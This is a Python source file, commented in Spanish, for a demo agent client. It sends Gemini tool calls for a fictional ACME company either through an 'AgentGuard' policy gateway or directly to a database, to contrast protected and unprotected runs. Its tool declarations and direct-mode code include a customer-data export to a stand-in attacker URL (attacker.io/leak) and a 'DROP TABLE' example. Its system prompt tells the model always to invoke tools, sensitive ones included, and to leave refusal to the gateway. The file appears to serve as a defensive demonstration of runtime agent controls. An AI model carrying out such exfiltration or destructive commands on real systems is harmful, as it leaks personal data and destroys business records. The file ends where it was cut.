"""Cliente de Agente Inteligente para ACME Corporation (Google Gemini + AgentGuard).

Orquesta el ciclo de vida del agente autónomo de IA:
1. Descubrimiento de contexto y catálogo en AgentGuard (PEP/PDP).
2. Razonamiento LLM con Google Gemini (Function Calling / Tools) o disparo determinístico.
3. Soporte polifacético para:
   - Agente de Ventas (operaciones comerciales, cotizaciones, reembolsos, precios, seguridad).
   - Asistente "Consultante BI" (consultas analíticas, gráficos de torta y protección contra borrado).
4. Despacho comparativo:
   - Modo Protegido: Intercepción por el Gateway de AgentGuard (X-AgentGuard-Key).
   - Modo Directo: Ejecución directa sin salvaguardas (demostración de vulnerabilidad y catástrofe).
"""

import json
import logging
import re
from typing import Any, Dict, List, Optional, Tuple, Union

import httpx

from agent.presets import PRESETS_BY_ID, get_preset_by_id
from server.config import settings
from server.database import AcmeDatabase, DatabaseWipedError, acme_db

logger = logging.getLogger("acme.agent")
GEMINI_FALLBACK_MODELS: Tuple[str, ...] = ("gemini-3.8-flash", "gemini-3.5-flash-lite")


def _build_generation_config(model_name: str) -> Dict[str, Any]:
    """Configura temperatura determinista y pensamiento rápido ('low') en modelos Gemini 3."""
    config: Dict[str, Any] = {"temperature": 0.2}
    if model_name.startswith("gemini-3"):
        config["thinkingConfig"] = {"thinkingLevel": "low"}
    return config

# ---------------------------------------------------------------------------
# Declaración de Herramientas para Gemini Function Calling (OpenAPI 3.0 schema)
# ---------------------------------------------------------------------------
GEMINI_FUNCTION_DECLARATIONS = [
    {
        "name": "create_quote",
        "description": "Emite una cotización formal y presupuesto de venta para un cliente de ACME Corporation.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "customer": {
                    "type": "STRING",
                    "description": "Nombre completo o razón social del cliente (ej. Wile E. Coyote).",
                },
                "customer_id": {
                    "type": "STRING",
                    "description": "Identificador único del cliente en CRM (ej. cust_coyote_01).",
                },
                "product": {
                    "type": "STRING",
                    "description": "Código o SKU del producto solicitado (ej. ACME-ROCKET-01).",
                },
                "amount": {
                    "type": "NUMBER",
                    "description": "Monto total cotizado en dólares estadounidenses (USD).",
                },
                "currency": {
                    "type": "STRING",
                    "description": "Moneda de la cotización (por defecto USD).",
                },
                "details": {
                    "type": "STRING",
                    "description": "Detalles técnicos o condiciones de entrega.",
                },
            },
            "required": ["customer", "amount"],
        },
    },
    {
        "name": "update_price",
        "description": "Modifica el precio oficial de lista de un producto en el catálogo comercial de ACME.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "product_id": {
                    "type": "STRING",
                    "description": "Identificador o SKU del producto a modificar (ej. ACME-ROCKET-01).",
                },
                "new_price": {
                    "type": "NUMBER",
                    "description": "Nuevo precio de lista unitario en USD.",
                },
                "reason": {
                    "type": "STRING",
                    "description": "Justificación comercial para el cambio de precio.",
                },
            },
            "required": ["product_id", "new_price"],
        },
    },
    {
        "name": "refund",
        "description": "Procesa un reembolso monetario a la cuenta o tarjeta de un cliente a través de Stripe.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "transaction_id": {
                    "type": "STRING",
                    "description": "Identificador de la transacción original (ej. tx_looney_9921).",
                },
                "customer_id": {
                    "type": "STRING",
                    "description": "Identificador del cliente en el sistema CRM.",
                },
                "customer_name": {
                    "type": "STRING",
                    "description": "Nombre del cliente destinatario del reintegro.",
                },
                "amount": {
                    "type": "NUMBER",
                    "description": "Importe total a reembolsar en USD.",
                },
                "reason": {
                    "type": "STRING",
                    "description": "Motivo del reclamo o falla del producto.",
                },
            },
            "required": ["transaction_id", "amount"],
        },
    },
    {
        "name": "export_customers",
        "description": "Exporta la base de datos completa de clientes con información fiscal sensible (PII/CUIT).",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "destination": {
                    "type": "STRING",
                    "description": "URL o servidor destino donde enviar el archivo (ej. https://attacker.io/leak).",
                },
                "format": {
                    "type": "STRING",
                    "description": "Formato de exportación (ej. csv, json).",
                },
                "include_ssn": {
                    "type": "BOOLEAN",
                    "description": "Incluir números fiscales y CUIT de los clientes.",
                },
                "filter": {
                    "type": "STRING",
                    "description": "Filtro de clientes (ej. all, vip).",
                },
            },
            "required": ["destination"],
        },
    },
    {
        "name": "database_drop",
        "description": "Ejecuta una sentencia SQL destructiva o eliminación de tablas en la base de datos.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "query": {
                    "type": "STRING",
                    "description": "Sentencia SQL a ejecutar (ej. DROP TABLE products;).",
                },
                "force": {
                    "type": "BOOLEAN",
                    "description": "Confirmación forzada de la operación.",
                },
            },
            "required": ["query"],
        },
    },
    # Herramientas del Caso de Uso BI & Consultante
    {
        "name": "query_sales",
        "description": "Consulta el registro histórico de ventas de ACME Corp aplicando filtros opcionales de monto mínimo, período o categoría.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "min_amount": {
                    "type": "NUMBER",
                    "description": "Monto mínimo en USD para filtrar registros (ej. 1000.0).",
                },
                "max_amount": {
                    "type": "NUMBER",
                    "description": "Monto máximo en USD para filtrar registros.",
                },
                "period": {
                    "type": "STRING",
                    "description": "Período fiscal de consulta: 'last_month' o 'current_month'.",
                },
                "category": {
                    "type": "STRING",
                    "description": "Categoría de producto (ej. Propulsión, Impacto Pesado, Explosivos, Movilidad).",
                },
            },
        },
    },
    {
        "name": "generate_pie_chart",
        "description": "Genera y renderiza una gráfica de torta con la distribución de ventas en USD y porcentaje por producto.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "min_amount": {
                    "type": "NUMBER",
                    "description": "Monto mínimo para el conjunto de datos del gráfico.",
                },
                "period": {
                    "type": "STRING",
                    "description": "Período fiscal: 'last_month' o 'current_month'.",
                },
            },
        },
    },
    {
        "name": "delete_sales",
        "description": "Elimina registros de ventas de la base de datos de ACME según condiciones de monto y período.",
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "max_amount": {
                    "type": "NUMBER",
                    "description": "Monto máximo de ventas a eliminar de la base de datos (ej. 1000.0).",
                },
                "min_amount": {
                    "type": "NUMBER",
                    "description": "Monto mínimo de ventas a eliminar.",
                },
                "period": {
                    "type": "STRING",
                    "description": "Período fiscal de los registros a eliminar.",
                },
            },
        },
    },
]


async def discover_agentguard_context(
    agentguard_url: str,
    agentguard_api_key: str,
    timeout: float = 6.0,
) -> Dict[str, Any]:
    """Consulta el endpoint /gateway/context de AgentGuard para auto-descubrir IDs."""
    clean_url = agentguard_url.rstrip("/")
    endpoint = f"{clean_url}/api/v1/gateway/context"
    headers = {"X-AgentGuard-Key": agentguard_api_key}

    async with httpx.AsyncClient(timeout=timeout) as client:
        resp = await client.get(endpoint, headers=headers)
        if resp.status_code != 200:
            raise RuntimeError(
                f"Error al descubrir contexto en AgentGuard ({resp.status_code}): {resp.text}"
            )
        return resp.json()


def resolve_tool_id_for_action(context: Dict[str, Any], action_name: str) -> Optional[str]:
    """Encuentra el UUID de la herramienta que contiene una determinada acción."""
    canonical_action = "database.drop" if action_name in ("database_drop", "database.drop") else action_name
    if canonical_action == "generate_pie_chart":
        canonical_action = "query_sales"

    for tool in context.get("tools", []):
        for act in tool.get("actions", []):
            act_name = act.get("action_name") or act.get("name")
            if act_name == canonical_action:
                return tool.get("id")

    # Mapeos por convención tolerantes a tildes
    action_to_tool_patterns = {
        "create_quote": ("crm", "factur"),
        "export_customers": ("crm", "factur"),
        "refund": ("stripe", "pago"),
        "update_price": ("catalog", "catálogo", "precio"),
        "database.drop": ("db", "database", "administrador", "base"),
        "database_drop": ("db", "database", "administrador", "base"),
        "query_sales": ("bi", "venta", "sales"),
        "delete_sales": ("bi", "venta", "sales"),
        "generate_pie_chart": ("bi", "venta", "sales"),
    }
    patterns = action_to_tool_patterns.get(canonical_action, ())
    for tool in context.get("tools", []):
        tool_name = tool.get("name", "").lower()
        if any(pat in tool_name for pat in patterns):
            return tool.get("id")

    return None


def resolve_agent_id(context: Dict[str, Any], action_name: Optional[str] = None) -> Optional[str]:
    """Obtiene el ID del agente adecuado según la acción solicitada.

    Para acciones BI ('query_sales', 'delete_sales', 'generate_pie_chart'): selecciona 'Consultante BI'.
    Para acciones de ventas/seguridad ('create_quote', 'update_price', etc.): selecciona 'Agente de Ventas'.
    """
    agents = context.get("agents", [])
    if not agents:
        return None

    bi_actions = ("query_sales", "delete_sales", "generate_pie_chart")
    is_bi = bool(action_name and str(action_name).strip() in bi_actions)

    if is_bi:
        for ag in agents:
            name_lower = ag.get("name", "").lower()
            if "consultante" in name_lower or "bi" in name_lower:
                return ag.get("id")

    for ag in agents:
        name_lower = ag.get("name", "").lower()
        if "ventas" in name_lower or "sales" in name_lower:
            return ag.get("id")

    return agents[0].get("id")


class GeminiAgentClient:
    """Cliente autónomo de IA para ejecutar escenarios de ACME Corporation."""

    def __init__(
        self,
        gemini_api_key: Optional[str] = None,
        gemini_model: Optional[str] = None,
        agentguard_url: Optional[str] = None,
        agentguard_api_key: Optional[str] = None,
        db: Optional[AcmeDatabase] = None,
    ) -> None:
        self.gemini_api_key = gemini_api_key or settings.GEMINI_API_KEY
        self.gemini_model = gemini_model or settings.GEMINI_MODEL
        self.agentguard_url = agentguard_url or settings.AGENTGUARD_URL
        self.agentguard_api_key = agentguard_api_key or settings.AGENTGUARD_API_KEY
        self.db = db or acme_db

    async def execute_in_direct_mode(
        self,
        action_name: str,
        parameters: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Ejecuta una acción DIRECTAMENTE contra la base de datos SQLite de ACME Corp."""
        canonical_action = "database.drop" if action_name in ("database_drop", "database.drop") else action_name

        try:
            if canonical_action == "create_quote":
                res = self.db.record_quote(
                    customer_id=parameters.get("customer_id"),
                    customer_name=parameters.get("customer"),
                    product_sku=parameters.get("product"),
                    amount=parameters.get("amount"),
                    currency=parameters.get("currency", "USD"),
                    details=parameters.get("details"),
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "update_price":
                prod_id = parameters.get("product_id") or parameters.get("sku") or "ACME-ROCKET-01"
                new_price = parameters.get("new_price", 9.99)
                reason = parameters.get("reason", "Alteración directa por agente de ventas")
                res = self.db.update_product_price(
                    product_identifier=prod_id,
                    new_price=new_price,
                    reason=reason,
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "refund":
                res = self.db.record_refund(
                    transaction_id=parameters.get("transaction_id", "tx_direct_001"),
                    customer_id=parameters.get("customer_id"),
                    customer_name=parameters.get("customer_name"),
                    amount=parameters.get("amount", 12500.0),
                    reason=parameters.get("reason", "Reembolso directo sin aprobación"),
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "export_customers":
                res = self.db.export_all_customers(
                    destination=parameters.get("destination", "https://attacker.io/leak"),
                    format_type=parameters.get("format", "csv"),
                    include_ssn=bool(parameters.get("include_ssn", True)),
                    requested_by="Agente Sin Protección",
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "database.drop":
                res = self.db.drop_acme_database(
                    query=parameters.get("query"),
                    reason=parameters.get("reason", "Ataque Destructivo en Modo Directo"),
                )
                return {"status": "wiped", "direct_execution": True, "result": res}

            elif canonical_action in ("query_sales", "generate_pie_chart"):
                min_amt = parameters.get("min_amount")
                max_amt = parameters.get("max_amount")
                period = parameters.get("period", "last_month")
                category = parameters.get("category")
                res = self.db.query_sales_records(
                    min_amount=min_amt,
                    max_amount=max_amt,
                    period=period,
                    category=category,
                )
                return {"status": "success", "direct_execution": True, "result": res}

            elif canonical_action == "delete_sales":
                max_amt = parameters.get("max_amount")
                min_amt = parameters.get("min_amount")
                period = parameters.get("period")
                res = self.db.delete_sales_records(
                    max_amount=max_amt,
                    min_amount=min_amt,
                    period=period,
                )
                return {"status": "success", "direct_execution": True, "result": res}

            else:
                return {
                    "status": "error",
                    "direct_execution": True,
                    "error": f"Acción desconocida '{action_name}' para ejecución directa",
                }

        except DatabaseWipedError as dwe:
            return {
                "status": "error",
                "direct_execution": True,
                "error": str(dwe),
                "is_database_wiped": True,
            }
        except Exception as exc:
            return {
                "status": "error",
                "direct_execution": True,
                "error": str(exc),
            }

    async def execute_in_protected_mode(
        self,
        action_name: str,
        parameters: Dict[str, Any],
        resource: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Intercepta la llamada a través del Gateway REST de AgentGuard (/api/v1/gateway/execute)."""
        if not self.agentguard_api_key:
            return {
                "status": "error",
                "decision": "DENY",
                "error": "Se requiere una clave AGENTGUARD_API_KEY (X-AgentGuard-Key) para ejecutar en Modo Protegido.",
            }

        canonical_action = "database.drop" if action_name in ("database_drop", "database.drop") else action_name
        if canonical_action == "generate_pie_chart":
            canonical_action = "query_sales"

        # 1. Descubrir contexto en AgentGuard
        try:
            context = await discover_agentguard_context(
                agentguard_url=self.agentguard_url,
                agentguard_api_key=self.agentguard_api_key,
            )
        except Exception as exc:
            return {
                "status": "error",
                "decision": "DENY",
                "error": f"No fue posible contactar a AgentGuard en {self.agentguard_url}: {exc}",
            }

        org_id = context.get("organization_id")
        agent_id = resolve_agent_id(context, action_name=canonical_action)
        tool_id = resolve_tool_id_for_action(context, canonical_action)

        if not org_id or not agent_id or not tool_id:
            return {
                "status": "error",
                "decision": "DENY",
                "error": (
                    f"No se pudo resolver el contexto completo en AgentGuard para la acción '{canonical_action}'. "
                    f"Org: {org_id}, Agente: {agent_id}, Herramienta: {tool_id}"
                ),
            }

        # Recurso por defecto según la acción
        if not resource:
            resource_map = {
                "create_quote": "crm:quotes",
                "export_customers": "crm:customers:export",
                "refund": f"stripe:refunds:{parameters.get('transaction_id', 'tx_demo')}",
                "update_price": f"catalog:prices:{parameters.get('product_id', 'ACME-ROCKET-01')}",
                "database.drop": "db:schema:drop",
                "query_sales": "bi:sales:query",
                "delete_sales": "bi:sales:delete",
            }
            resource = resource_map.get(canonical_action, f"acme:{canonical_action}")

        # 2. Despachar solicitud al PEP de AgentGuard
        execute_url = f"{self.agentguard_url.rstrip('/')}/api/v1/gateway/execute"
        headers = {
            "X-AgentGuard-Key": self.agentguard_api_key,
            "Content-Type": "application/json",
        }
        payload = {
            "organization_id": org_id,
            "agent_id": agent_id,
            "tool_id": tool_id,
            "action_name": canonical_action,
            "parameters": parameters,
            "resource": resource,
        }

        try:
            async with httpx.AsyncClient(timeout=15.0) as client:
                resp = await client.post(execute_url, headers=headers, json=payload)
                try:
                    body = resp.json()
                except Exception:
                    body = {"raw": resp.text}
        except httpx.HTTPError as exc:
            detail = str(exc).strip() or type(exc).__name__
            return {
                "status_code": 504 if isinstance(exc, httpx.TimeoutException) else 502,
                "status": "error",
                "decision": "DENY",
                "error": f"Fallo al despachar ejecución en AgentGuard ({type(exc).__name__}): {detail}",
                "error_message": f"No se recibió respuesta a tiempo del Gateway de AgentGuard ({detail}).",
            }

        return {
            "status_code": resp.status_code,
            "decision": body.get("decision", "DENY" if resp.status_code >= 400 else "ALLOW"),
            "execution_id": body.get("execution_id"),
            "approval_id": body.get("approval_id"),
            "alert_id": body.get("alert_id"),
            "security_analysis": body.get("security_analysis"),
            "status": body.get("status"),
            "result": body.get("result"),
            "error_message": body.get("error_message"),
            "latency_ms": body.get("latency_ms"),
            "raw_response": body,
        }

    async def run_scenario(
        self,
        prompt: Optional[str] = None,
        preset_id: Optional[str] = None,
        mode: str = "protected",
        use_llm: bool = True,
        override_parameters: Optional[Dict[str, Any]] = None,
        context_sales: Optional[List[Dict[str, Any]]] = None,
    ) -> Dict[str, Any]:
        """Ejecuta el ciclo de vida completo del agente en modo protegido o directo.

        Retorna una traza estructurada con todos los pasos para la consola web y CLI,
        incluyendo ui_payload con datos de tabla, gráfico de torta y oferta de filtro local.
        """
        steps: List[Dict[str, Any]] = []
        llm_tool_calls: List[Dict[str, Any]] = []
        gateway_verdicts: List[Dict[str, Any]] = []
        acme_results: List[Dict[str, Any]] = []
        final_answer = ""
        ui_payload: Dict[str, Any] = {}

        # 1. Resolver preset y prompt
        preset = get_preset_by_id(preset_id) if preset_id else None
        user_prompt = prompt or (preset["prompt"] if preset else "Consulta general sobre el catálogo de ACME")
        action_name = preset["action_name"] if preset else "create_quote"
        parameters = override_parameters or (preset["default_parameters"].copy() if preset else {})
        resource = preset.get("default_resource") if preset else None

        # Si el usuario ingresó un prompt libre personalizado sin Gemini (modo guiado BI), inferir intención BI
        should_infer_bi_intent = (
            not use_llm
            and preset_id not in ("legit_quote", "attack_price", "hitl_refund", "attack_exfil", "attack_drop_db")
            and (preset is None or (prompt is not None and prompt.strip() != preset.get("prompt", "").strip()))
        )
        prompt_lower = (user_prompt or "").lower()
        if should_infer_bi_intent:
            extracted_amount: Optional[float] = None
            num_match = re.search(r"\$?\s*(\d{1,3}(?:[.,]\d{3})+|\d+(?:\.\d+)?)", prompt_lower)
            if num_match:
                raw_num = num_match.group(1)
                if "," in raw_num and "." not in raw_num:
                    raw_num = raw_num.replace(",", "")
                elif "," in raw_num and "." in raw_num:
                    raw_num = raw_num.replace(",", "")
                try:
                    extracted_amount = float(raw_num)
                except ValueError:
                    extracted_amount = None

            if "torta" in prompt_lower or "gráfico" in prompt_lower or "grafica" in prompt_lower:
                action_name = "generate_pie_chart"
                parameters = {
                    "min_amount": extracted_amount if extracted_amount is not None else 1000.0,
                    "period": "last_month",
                }
            elif ("borrá" in prompt_lower or "borrar" in prompt_lower or "eliminar" in prompt_lower or "borra" in prompt_lower) and (
                "venta" in prompt_lower or "registro" in prompt_lower or "menos de" in prompt_lower or "menor" in prompt_lower
            ):
                action_name = "delete_sales"
                parameters = {
                    **({"period": "last_month"} if "mes pasado" in prompt_lower else {}),
                    "max_amount": extracted_amount if extracted_amount is not None else 1000.0,
                }
            elif "ventas" in prompt_lower and "agente de ventas" not in prompt_lower and (
                extracted_amount is not None
                or any(k in prompt_lower for k in ("dame", "mostr", "consult", "mayores", "menores", "mes pasado", "este mes", "mes actual"))
            ):
                action_name = "query_sales"
                period_val = "current_month" if ("mes actual" in prompt_lower or "este mes" in prompt_lower) else "last_month"
                if "menor" in prompt_lower and extracted_amount is not None:
                    parameters = {"max_amount": extracted_amount, "period": period_val}
                else:
                    parameters = {
                        **({"min_amount": extracted_amount} if extracted_amount is not None else {"min_amount": 1000.0}),
                        "period": period_val,
                    }

        steps.append({
            "step": 1,
            "title": "Inicio de Sesión del Agente",
            "detail": f"Prompt recibido: '{user_prompt}' (Modo: {mode.upper()}, LLM: {'Gemini' if use_llm else 'Disparo Guiado / Determinístico'})",
            "status": "info",
        })

        tool_call_found = None
        model_turn_parts: List[Dict[str, Any]] = []
        active_gemini_model = self.gemini_model
        gemini_url = ""
        system_instruction_text = (
            "Eres el Consultante BI y Asistente Operativo de ACME Corporation (división Looney Tunes). "
            "Responde siempre en español formal y amigable. Dispones de herramientas declaradas (query_sales, "
            "generate_pie_chart, delete_sales, create_quote, update_price, refund, export_customers y database_drop). "
            "El motor externo de políticas AgentGuard es quien decide en tiempo de ejecución si cada herramienta está "
            "permitida, requiere aprobación humana o está bloqueada. Por ello, ante cualquier solicitud del usuario "
            "(incluso si pide eliminar registros o ejecutar acciones sensibles), invoca siempre la función declarada "
            "correspondiente sin auto-rechazarla antes de consultarla. Solo después de recibir el functionResponse con "
            "decisión DENY/bloqueado, explica constructivamente que no tienes autorización para modificar ni borrar "
            "la base de datos de ACME pero sí puedes filtrar u ocultar esos registros en la vista en pantalla. "
            "FORMATO DE SÍNTESIS: Cuando query_sales o generate_pie_chart devuelve datos, la interfaz web YA renderiza "
            "automáticamente debajo la Tabla de Resultados y la Gráfica de Torta SVG. Por eso NO repitas ni enumeres "
            "fila por fila cada venta ni códigos internos (IDs SALE-*, cust_* o SKUs) salvo que el usuario lo pida "
            "explícitamente. Entrega un resumen ejecutivo breve de 2 a 3 líneas (o hasta 3 viñetas en líneas separadas) "
            "destacando cantidad de registros, monto total en USD, el producto o cliente principal y una sugerencia breve "
            "de siguiente paso."
        )

        if use_llm:
            if not self.gemini_api_key or not self.gemini_api_key.strip():
                raise ValueError(
                    "Se requiere una clave GEMINI_API_KEY válida para ejecutar el agente con Gemini LLM real. "
                    "Por favor configure su API Key en el panel de control o en el archivo .env."
                )

            steps.append({
                "step": 2,
                "title": "Inferencia con Google Gemini",
                "detail": f"Consultando modelo {self.gemini_model} con catálogo de {len(GEMINI_FUNCTION_DECLARATIONS)} herramientas...",
                "status": "info",
            })

            candidate_models: List[str] = [self.gemini_model] + [
                m for m in GEMINI_FALLBACK_MODELS if m != self.gemini_model
            ]

            gemini_data_1: Dict[str, Any] = {}
            async with httpx.AsyncClient(timeout=45.0) as client:
                for idx, candidate_model in enumerate(candidate_models):
                    gemini_url = (
                        f"https://generativelanguage.googleapis.com/v1beta/models/"
                        f"{candidate_model}:generateContent?key={self.gemini_api_key}"
                    )
                    payload_turn_1 = {
                        "systemInstruction": {"parts": [{"text": system_instruction_text}]},
                        "contents": [{"role": "user", "parts": [{"text": user_prompt}]}],
                        "tools": [{"functionDeclarations": GEMINI_FUNCTION_DECLARATIONS}],
                        "generationConfig": _build_generation_config(candidate_model),
                    }
                    try:
                        resp_1 = await client.post(gemini_url, json=payload_turn_1)
                    except httpx.TimeoutException as tex:
                        if idx < len(candidate_models) - 1:
                            logger.warning(
                                "Tiempo de espera agotado con '%s' (%s); reintentando con '%s'...",
                                candidate_model,
                                type(tex).__name__,
                                candidate_models[idx + 1],
                            )
                            continue
                        raise RuntimeError(
                            f"Tiempo de espera agotado al consultar Google Gemini ({candidate_model}). "
                            "Reintentá o seleccioná el modelo 'gemini-3.5-flash-lite'."
                        ) from tex

                    if resp_1.status_code == 200:
                        active_gemini_model = candidate_model
                        gemini_data_1 = resp_1.json()
                        break
                    if resp_1.status_code in (404, 429, 503) and idx < len(candidate_models) - 1:
                        logger.warning(
                            "Modelo Gemini '%s' no disponible (HTTP %s); reintentando con '%s'...",
                            candidate_model,
                            resp_1.status_code,
                            candidate_models[idx + 1],
                        )
                        continue
                    raise RuntimeError(f"Error de Gemini API ({resp_1.status_code}): {resp_1.text}")

            candidates = gemini_data_1.get("candidates", [])
            raw_parts = candidates[0].get("content", {}).get("parts", []) if candidates else []
            model_turn_parts = [p for p in raw_parts if isinstance(p, dict)]
            text_response = ""

            for part in model_turn_parts:
                if "functionCall" in part and tool_call_found is None:
                    tool_call_found = part["functionCall"]
                elif "text" in part and not part.get("thought"):
                    text_response += part["text"]

            if tool_call_found:
                action_name = tool_call_found.get("name")
                raw_args = tool_call_found.get("args") or {}
                parameters = dict(override_parameters) if override_parameters else dict(raw_args)
                if preset and action_name != preset.get("action_name") and not (
                    action_name == "database_drop" and preset.get("action_name") == "database.drop"
                ):
                    resource = None

                llm_tool_calls.append({"action_name": action_name, "parameters": parameters})
                fallback_note = (
                    f" [Fallback automático a {active_gemini_model}]"
                    if active_gemini_model != self.gemini_model
                    else ""
                )
                steps.append({
                    "step": 3,
                    "title": f"Gemini seleccionó la herramienta '{action_name}'{fallback_note}",
                    "detail": f"Argumentos determinados por el LLM: {json.dumps(parameters, ensure_ascii=False)}",
                    "status": "warning",
                })
            else:
                steps.append({
                    "step": 3,
                    "title": "Gemini respondió directamente sin invocar herramientas",
                    "detail": text_response or "Respuesta conversacional pura.",
                    "status": "info",
                })
                final_answer = text_response
                return {
                    "mode": mode,
                    "use_llm": True,
                    "model_used": active_gemini_model,
                    "llm_tool_calls": [],
                    "gateway_verdicts": [],
                    "acme_results": [],
                    "final_answer": final_answer,
                    "steps": steps,
                    "ui_payload": ui_payload,
                }
        else:
            # Modo Guiado / Determinístico
            llm_tool_calls.append({"action_name": action_name, "parameters": parameters})
            steps.append({
                "step": 2,
                "title": f"Carga Determinística de Acción '{action_name}'",
                "detail": f"Parámetros asignados: {json.dumps(parameters, ensure_ascii=False)}",
                "status": "info",
            })

        # -------------------------------------------------------------------
        # Despacho: Modo Protegido (AgentGuard) vs Modo Directo (Sin Protección)
        # -------------------------------------------------------------------
        is_pie_chart_shortcut = action_name == "generate_pie_chart"
        effective_dispatch_action = "query_sales" if is_pie_chart_shortcut else action_name

        if mode == "protected":
            steps.append({
                "step": 4,
                "title": "Intercepción en Tiempo de Ejecución (AgentGuard PEP/PDP)",
                "detail": f"Enviando solicitud a {self.agentguard_url}/api/v1/gateway/execute con X-AgentGuard-Key para '{effective_dispatch_action}'...",
                "status": "info",
            })

            gw_result = await self.execute_in_protected_mode(
                action_name=effective_dispatch_action,
                parameters=parameters,
                resource=resource,
            )
            gateway_verdicts.append(gw_result)
            decision = gw_result.get("decision", "DENY")

            if decision == "ALLOW":
                steps.append({
                    "step": 5,
                    "title": "Veredicto AgentGuard: ALLOW (200 OK)",
                    "detail": "Acción autorizada por política PDP y despachada exitosamente al servicio de destino.",
                    "status": "success",
                })
                function_response_payload = {"status": "success", "data": gw_result.get("result")}

                # Si fue una consulta de ventas o gráfico de torta, reutilizar el resultado devuelto por AgentGuard si ya trae 'sales'
                if effective_dispatch_action == "query_sales":
                    gw_res_data = gw_result.get("result")
                    if isinstance(gw_res_data, dict) and isinstance(gw_res_data.get("sales"), list):
                        sales_data = gw_res_data
                    else:
                        sales_data = self.db.query_sales_records(
                            min_amount=parameters.get("min_amount"),
                            max_amount=parameters.get("max_amount"),
                            period=parameters.get("period", "last_month"),
                            category=parameters.get("category"),
                            log_event=False,
                        )
                    ui_payload = {
                        "table_data": sales_data.get("sales", []),
                        "pie_chart": sales_data.get("pie_chart", []),
                        "total_records": sales_data.get("total_records", 0),
                        "total_amount": sales_data.get("total_amount", 0.0),
                        "period": sales_data.get("period"),
                        "filters": sales_data.get("filters"),
                        "is_chart_view": is_pie_chart_shortcut,
                    }

            elif decision == "REQUIRE_APPROVAL":
                steps.append({
                    "step": 5,
                    "title": "Veredicto AgentGuard: REQUIRE_APPROVAL (202 Accepted)",
                    "detail": (
                        f"Acción suspendida sujeta a aprobación humana obligatoria en bandeja HITL. "
                        f"Motivo: {gw_result.get('error_message') or 'Monto supera el umbral autónomo'}"
                    ),
                    "status": "warning",
                })
                function_response_payload = {
                    "status": "suspended",
                    "decision": "REQUIRE_APPROVAL",
                    "message": "Operación suspendida sujeta a revisión de un supervisor humano en la bandeja de AgentGuard.",
                }

            else:
                # DENY
                steps.append({
                    "step": 5,
                    "title": "Veredicto AgentGuard: DENY (403 Forbidden)",
                    "detail": (
                        f"Acción bloqueada por política de seguridad Fail-Closed. "
                        f"Razón: {gw_result.get('error_message') or 'Violación de políticas de acceso o falta de capacidad'}"
                    ),
                    "status": "danger",
                })
                function_response_payload = {
                    "status": "blocked",
                    "decision": "DENY",
                    "error": gw_result.get("error_message") or "Acción denegada por AgentGuard.",
                }

                # Caso estelar: delete_sales bloqueado por AgentGuard para el administrativo
                if effective_dispatch_action == "delete_sales":
                    # Conservar datos de ventas del mes pasado sin duplicar evento en bitácora
                    threshold_val = float(parameters.get("max_amount") or 1000.0)
                    last_sales = self.db.query_sales_records(
                        period=parameters.get("period") or "last_month",
                        log_event=False,
                    )
                    ui_payload = {
                        "table_data": last_sales.get("sales", []),
                        "pie_chart": last_sales.get("pie_chart", []),
                        "offer_local_filter": {
                            "max_amount": threshold_val,
                            "min_amount": threshold_val,
                        },
                        "blocked_reason": "Política de solo lectura del Consultante BI en AgentGuard",
                    }

        else:
            # Modo Directo: Sin protección alguna
            steps.append({
                "step": 4,
                "title": "¡ADVERTENCIA! Modo Directo Activado (AgentGuard OMITIDO)",
                "detail": "La llamada a la herramienta se ejecuta directamente sobre la infraestructura de ACME Corp sin pasar por el PDP.",
                "status": "danger",
            })

            direct_res = await self.execute_in_direct_mode(
                action_name=action_name,
                parameters=parameters,
            )
            acme_results.append(direct_res)

            if direct_res.get("is_database_wiped"):
                steps.append({
                    "step": 5,
                    "title": "Fallo del Servidor: Base de Datos Purgada (503 Service Unavailable)",
                    "detail": direct_res.get("error"),
                    "status": "danger",
                })
            elif direct_res.get("status") == "wiped":
                steps.append({
                    "step": 5,
                    "title": "¡CATASTRÓFICO! Base de Datos Eliminada por Completo",
                    "detail": "El comando SQL DROP TABLE borró todas las tablas de ACME. La empresa queda inoperable.",
                    "status": "danger",
                })
            elif direct_res.get("result", {}).get("is_tampered"):
                steps.append({
                    "step": 5,
                    "title": "¡ALERTA DE SABOTAJE! Precio Alterado en Catálogo Real",
                    "detail": (
                        f"El producto '{direct_res['result']['product_name']}' fue rebajado a "
                        f"${direct_res['result']['new_price']} USD (Base: ${direct_res['result']['base_price']} USD)."
                    ),
                    "status": "danger",
                })
            elif action_name == "delete_sales":
                deleted_cnt = direct_res.get("result", {}).get("deleted_count", 0)
                steps.append({
                    "step": 5,
                    "title": "¡REGISTROS ELIMINADOS EN SQLITE REAL!",
                    "detail": f"Al no mediar protección de AgentGuard, se eliminaron {deleted_cnt} ventas de la base de datos.",
                    "status": "danger",
                })
            else:
                steps.append({
                    "step": 5,
                    "title": "Ejecución Directa Completada",
                    "detail": json.dumps(direct_res, ensure_ascii=False),
                    "status": "warning",
                })

            function_response_payload = direct_res

            # Si fue query_sales o generate_pie_chart en directo, actualizar ui_payload
            if effective_dispatch_action == "query_sales" and "result" in direct_res:
                q_res = direct_res["result"]
                ui_payload = {
                    "table_data": q_res.get("sales", []),
                    "pie_chart": q_res.get("pie_chart", []),
                    "total_records": q_res.get("total_records", 0),
                    "total_amount": q_res.get("total_amount", 0.0),
                    "period": q_res.get("period"),
                    "filters": q_res.get("filters"),
                    "is_chart_view": is_pie_chart_shortcut,
                }

        # -------------------------------------------------------------------
        # Síntesis determinística reutilizable (Modo Guiado o fallback Turno 2)
        # -------------------------------------------------------------------
        def _build_deterministic_answer() -> str:
            if mode == "protected":
                dec = gateway_verdicts[0].get("decision") if gateway_verdicts else "UNKNOWN"
                if dec == "ALLOW":
                    if effective_dispatch_action == "query_sales":
                        cnt = ui_payload.get("total_records", len(ui_payload.get("table_data", [])))
